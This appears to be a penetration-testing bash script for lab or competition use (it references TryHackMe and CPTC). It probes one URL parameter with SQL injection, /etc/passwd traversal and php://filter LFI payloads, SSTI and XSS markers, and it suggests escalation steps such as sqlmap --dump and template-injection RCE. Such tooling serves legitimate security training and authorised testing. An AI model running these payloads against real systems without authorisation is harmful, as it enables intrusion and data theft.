#!/usr/bin/env bash
# ==============================================================================
# web-vuln-tests.sh — probe ONE input parameter for the classic bug classes:
#                      SQLi / LFI / SSTI / reflected-XSS (+ quick file/paths)
#
# CONCEPT: after web-recon.sh hands you the attack surface, you pick a page that
# ACCEPTS INPUT (anything with a ?param=value, a form field, a search box) and
# point this script at that URL. It mutates that one param with safe, noisy
# payloads and looks for anomalies. It will NOT "shoulder-surf" an app that has
# no inputs — static pages with no ?param legitimately produce zero hits.
#
# HOW TO USE:
#   ./web-vuln-tests.sh "http://10.10.20.15:8080/app"
#   ./web-vuln-tests.sh "http://10.10.20.15/search?q=1"
#                                                ^ param  ^ any normal value
#
# WHERE TO GET PARAMS FROM (if none obvious):
#   * view-source: in the browser — <form> names, <input name="...">, array keys
#   * ffuf param names:
#       ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
#            -u "http://IP/page.php?FUZZ=1" -fs <baseline-size>
#   * Burp: send a request, watch POST bodies (user=, id=, username=...)
#   * JS files the page loads (grep for "?\w+=" patterns)
#
# OUTPUT: loot/vuln-tests-HHMM/ ALWAYS has hits.txt (even when zero — a clean
# pass IS a finding for the report: "param tested for class X, no anomalies").
# ==============================================================================

set -u
URL="${1:-}"
[ -z "$URL" ] && { echo "usage: $0 \"http://TARGET/page?param=value\""; exit 1; }

has() { command -v "$1" >/dev/null 2>&1; }

mkdir -p loot
T=$(date +%H%M)
OUT="loot/vuln-tests-$T"
mkdir -p "$OUT"
HITS="$OUT/hits.txt"
STEPS="$OUT/manual-next-steps.txt"
: > "$HITS"; : > "$STEPS"
echo "[*] Testing: $URL"
echo "[*] Loot:    $OUT/"

# Split the url into base, param, value
BASE="${URL%%\?*}"
Q="${URL#*\?}"
PARAM="id"; VAL=""
if [ "$Q" != "$URL" ]; then
    PARAM=$(echo "$Q" | cut -d= -f1)
    VAL=$(echo "$Q" | cut -d= -f2-)
fi
echo "[*] Focusing on param:    '$PARAM'  value '$VAL'"
echo "[*] Baseline:             '$BASE'"

# Reachability check first — fail fast with a clear message
REACH=$(curl -sk --max-time 6 -o /dev/null -w '%{http_code}' "$BASE")
echo "[*] Baseline http code:   $REACH"
if [ "$REACH" = "000" ]; then
    echo "[!] Target is DOWN or unreachable (000). Check the machine still exists"
    echo "    (THM panel) / is not /127.0.0.1 typo'd / box needs VPN up."
    echo "[i] negative result recorded in $HITS"
    echo "[!] target unreachable (000) — nothing probed" >> "$HITS"
    exit 0
fi

if [ -z "$VAL" ]; then
    echo "[!] This URL has NO ?param=value to mutate — nothing to test here."
    echo "[i] Pick a URL with an input (form page / search / ?id), then rerun."
    echo "[i] Try: view-source in browser, or ffuf burp-parameter-names.txt"
    echo "[i] target has no input param — nothing probed, this is not an error" >> "$HITS"
    exit 0
fi

# ---------- 1. SQLi — visible-error strings + response-differential ----------
echo "[*] [1/5] SQLi probing (error strings + response diff)..."
LEN0=$(curl -sk --max-time 5 "$BASE?$PARAM=$VAL" | wc -c)
for P in "'" "\x27" "%27%20OR%20%271%27%3D%271" "1%27--" "1%20OR%201%3D1"; do
    RESP=$(curl -sk --max-time 5 "$BASE?$PARAM=$VAL$P")
    LEN=$(echo "$RESP" | wc -c)
    M=$(echo "$RESP" | grep -icE \
       'sql|syntax|db error|mysql|postgres|sqlite|odbc|entity|unterminated|no such|nopermission|syntaxerror')
    if [ "$M" -gt 0 ]; then
        echo "  [+] SQL-ish error surfaced on $PARAM$P"
        echo "  [+] SQL-ish error surfaced on $PARAM$P" >> "$HITS"
    elif [ $((LEN > LEN0 ? LEN - LEN0 : LEN0 - LEN)) -gt 60 ]; then
        echo "  [?] response size differs ${LEN}/${LEN0} on $PARAM$P — manual check worth it"
        echo "  [?] response size differs ${LEN}/${LEN0} on $PARAM$P — manual check worth it" >> "$HITS"
    fi
done
if [ -s "$HITS" ]; then
    echo "  sqlmap: sqlmap -u '$URL' -p $PARAM --batch --risk=1 --level=1 --dump" >> "$STEPS"
fi

# ---------- 2. LFI ------------------------------------------------------------
echo "[*] [2/5] LFI probing (/etc/passwd variants)..."
for P in /etc/passwd ../../../../etc/passwd ....//....//etc/passwd \
         php://filter/convert.base64-encode/resource=../etc/passwd; do
    ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$P")
    R=$(curl -sk --max-time 5 "$BASE?$PARAM=$ENC" | grep -c 'root:x:')
    [ "$R" -gt 0 ] && echo "  [+] LFI hit: root:x served back on $PARAM ($P)" | tee -a "$HITS"
done
grep -q "LFI" "$HITS" && echo "  escalate: read config files, log poisoning, php:// wrappers" >> "$STEPS"

# ---------- 3. SSTI ------------------------------------------------------------
echo "[*] [3/5] SSTI probing ({{7*7}} -> 49)..."
P='%7B%7B7%2A7%7D%7D'
R=$(curl -sk --max-time 5 "$BASE?$PARAM=$P" | grep -o '49')
[ -n "$R" ] && echo "  [+] SSTI: {{7*7}} rendered as 49 in param '$PARAM' (Jinja/Twig family)" | tee -a "$HITS"
grep -q "SSTI" "$HITS" && echo "  escalate: {{config}} {%import os%} class-chain RCE payloads" >> "$STEPS"

# ---------- 4. XSS (reflection marker) ----------------------------------------
echo "[*] [4/5] XSS reflection check..."
P="cstcv8"   # unlikely string; if it comes back → param is reflected
RESP=$(curl -sk --max-time 5 "$BASE?$PARAM=$P")
if echo "$RESP" | grep -q "$P"; then
    echo "  [i] param '$PARAM' is REFLECTED (XSS possible)" | tee -a "$HITS"
    echo "  confirm manually with browser markers: <script>alert(1)</script>, then try from script list" >> "$STEPS"
fi

# ---------- 5. Quick-hits directory wordlist ----------------------------------
echo "[*] [5/5] quick-hits path sweep on base..."
if has ffuf && [ -f /usr/share/seclists/Discovery/Web-Content/quickhits.txt ]; then
    ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
         -u "$BASE/FUZZ" -mc 200,403 -t 25 -s -of csv -o "$OUT/quickhits.csv" 2>/dev/null
    [ -f "$OUT/quickhits.csv" ] && echo "  [i] quickhits: $OUT/quickhits.csv" | tee -a "$HITS"
fi

# ---------- Summary (never empty) ---------------------------------------------
if [ ! -s "$HITS" ]; then
    echo "  (clean pass: no anomalies on '$PARAM' across SQLi/LFI/SSTI/XSS)" >> "$HITS"
fi
echo ""
echo "===== hits ($HITS) ====="
cat "$HITS"
echo ""
[ -s "$STEPS" ] && { echo "===== next manual steps ====="; cat "$STEPS"; }
echo ""
echo "[i] A clean pass is still a REPORT LINE: 'param $PARAM tested against"
echo "[i] SQLi/LFI/SSTI/XSS reflection with no anomalies' — CPTC loves that."
